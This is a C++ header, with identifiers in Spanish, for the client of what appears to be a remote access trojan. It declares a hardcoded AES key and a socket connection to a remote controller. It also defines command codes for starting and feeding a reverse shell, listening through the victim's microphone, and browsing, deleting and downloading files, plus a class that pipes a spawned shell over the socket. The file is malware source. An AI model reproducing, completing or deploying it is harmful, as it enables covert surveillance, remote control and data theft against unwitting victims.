#ifndef _CLIENTE_H
#define _CLIENTE_H

#include "headers.hpp"
#include "mod_mic.hpp"

class ReverseShell;
class Mod_Mic;


class Cliente {
	private:
		std::mutex sck_mutex;

		unsigned char t_key[AES_KEY_LEN] = { 0x74, 0X48, 0X33, 0X2D, 0X4A, 0X5C, 0X2F, 0X61, 0X4E, 0X7C, 0X3C, 0X45, 0X72, 0X7B, 0X31, 0X33,
								  0X33, 0X37, 0X7D, 0X2E, 0X7E, 0X40, 0X69, 0X6C, 0X65, 0X72, 0X61, 0x25, 0x25, 0x5D, 0x72, 0x5E };
		ByteArray bKey;
		void Init_Key();

		ReverseShell* reverseSHELL = nullptr;
		Mod_Mic* mod_Mic = nullptr;
		
	public:
		SOCKET sckSocket = INVALID_SOCKET;

		std::map<std::string, EnumComandos::Enum> Comandos = {
			{"499", EnumComandos::PONG},
			{"500", EnumComandos::PING},
			{"501", EnumComandos::Reverse_Shell_Start},
			{"502", EnumComandos::Reverse_Shell_Command},
			{"503", EnumComandos::Reverse_Shell_Salida},
			{"504", EnumComandos::Reverse_Shell_Finish},
			{"505", EnumComandos::Mic_Refre_Dispositivos},
			{"506", EnumComandos::Mic_Refre_Resultado},
			{"507", EnumComandos::Mic_Iniciar_Escucha},
			{"508", EnumComandos::Mic_Detener_Escucha},
			{"510", EnumComandos::FM_Discos},
			{"512", EnumComandos::FM_Dir_Folder},
			{"514", EnumComandos::FM_Crear_Folder},
			{"515", EnumComandos::FM_Crear_Archivo},
			{"516", EnumComandos::FM_Borrar_Archivo},
			{"517", EnumComandos::FM_Descargar_Archivo},
			{"520", EnumComandos::FM_Descargar_Archivo_End}

		};

		Cliente();
		~Cliente();
		
		std::mutex mtx_shell;

		bool isRunning = true;
		bool isShellRunning = false;
		bool BLOCK_MODE = true;

		//Misc
		std::string ObtenerDesk();
		std::string ObtenerDown();

		//Sockets
		bool bConectar(const char* cIP, const char* cPuerto);
		void CerrarConexion();

		//Socket wraps
		int cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock = false);
		int cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock = false);

		ByteArray bDec(const unsigned char* pInput, size_t pLen);
		ByteArray bEnc(const unsigned char* pInput, size_t pLen);

		void iniPacket();

		void MainLoop();

		void ProcesarComando(std::vector<std::string> strIn);

};

class ReverseShell {
private:
	Cliente* copy_ptr;
	std::mutex mutex_shell;
	bool isRunning = false;
	PROCESS_INFORMATION pi;
	HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
	std::thread tRead;
public:
	ReverseShell(Cliente* nFather) : copy_ptr(nFather) {}
	SOCKET sckSocket;
	bool SpawnShell(const char* pStrComando);
	void TerminarShell();

	void thEscribirShell(std::string pStrInput);
	void thLeerShell(HANDLE hPipe);
};

#endif
